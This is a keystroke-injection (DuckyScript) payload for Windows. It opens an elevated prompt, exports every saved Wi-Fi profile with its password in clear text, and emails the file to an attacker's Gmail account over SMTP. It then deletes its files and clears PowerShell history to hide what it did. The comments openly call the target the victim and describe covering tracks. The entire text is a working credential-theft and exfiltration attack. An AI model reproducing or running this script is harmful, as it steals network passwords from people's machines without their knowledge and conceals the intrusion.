REM The following script will allow us to obtain network names and wifi passwords and export them via email
DELAY 5000
CONTROL ESCAPE
DELAY 100
STRING CMD
DELAY 100
CTRL-SHIFT ENTER
DELAY 1000
LEFTARROW
DELAY 100
ENTER
DELAY 300
STRING cd/
DELAY 300
ENTER
DELAY 100
REM make a directory to export the network profiles to
STRING mkdir wifi
DELAY 100
ENTER
DELAY 100
STRING cd wifi
DELAY 100
ENTER
DELAY 100
REM this command will export the profiles with the passwords in clear text
REM each profile will be exported to a seperate .xml file, the files will be concatanated later in script
STRING netsh wlan export profile key=clear
DELAY 200
ENTER
DELAY 1000
REM this command will copy all the .xml files to one .txt file that we can export
STRING copy *.xml wifi.txt
DELAY 200
ENTER
DELAY 500
STRING exit
DELAY 100
ENTER
DELAY 500
REM exit out of administrative command prompt to cover tracks
CONTROL ESCAPE
DELAY 500
REM opens powershell for use of command line emailing
STRING powershell
DELAY 1000
ENTER
DELAY 2000
STRING cd \
DELAY 200
ENTER 
DELAY 2000
STRING $EmailTo = "EMAILTO@gmail.com"
ENTER
DELAY 50
STRING $EmailFrom = "EMAILFROM@gmail.com" 
ENTER
DELAY 50
STRING $Subject = "The WIFI" 
ENTER
DELAY 50
STRING $Body = "See below" 
ENTER
DELAY 50
STRING $SMTPServer = "smtp.gmail.com" 
ENTER
DELAY 50
STRING $filenameAndPath = "C:\wifi\wifi.txt"
ENTER
DELAY 50
STRING $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body) 
ENTER
DELAY 50
STRING $attachment = New-Object System.Net.Mail.Attachment($filenameAndPath) 
ENTER
DELAY 50
STRING $SMTPMessage.Attachments.Add($attachment) 
ENTER
DELAY 50
STRING $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
ENTER
DELAY 50
STRING $SMTPClient.EnableSsl = $true 
ENTER
DELAY 50
STRING $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("YOUREMAIL@gmail.com", "14/16DIGITGOOGLEPASSWORD"); 
ENTER
DELAY 50
STRING $SMTPClient.Send($SMTPMessage)
ENTER
DELAY 1000
STRING exit
DELAY 500
ENTER
REM exit out of powershell to cover tracks
CONTROL ESCAPE
DELAY 150
STRING CMD
DELAY 100
CTRL-SHIFT ENTER
DELAY 1000
LEFTARROW
DELAY 100
ENTER
DELAY 2000
STRING cd/
DELAY 300
ENTER
DELAY 100
REM delete the document we created
STRING del wifi
DELAY 150
ENTER
DELAY 100
STRING y
DELAY 100
ENTER
DELAY 100
REM remove the entire directory from victim's machine
STRING rmdir wifi
DELAY 100
ENTER
DELAY 100
STRING exit
DELAY 100
ENTER
REM added this to fix there being an extra powershell
DELAY 100
CTRL C
DELAY 100 
STRING exit
ENTER
REM add functionality to clear the history of the windows file
CONTROL ESCAPE
DELAY 150
STRING powershell
DELAY 100
CTRL-SHIFT ENTER
DELAY 1000
LEFTARROW
DELAY 100
ENTER
DELAY 2000
STRING cd \
DELAY 200
ENTER
DELAY 200
STRING Clear-History 
ENTER
DELAY 200
STRING Remove-Item (Get-PSReadLineOption).HistorySavePath
DELAY 200
ENTER
DELAY 100 
STRING exit
ENTER
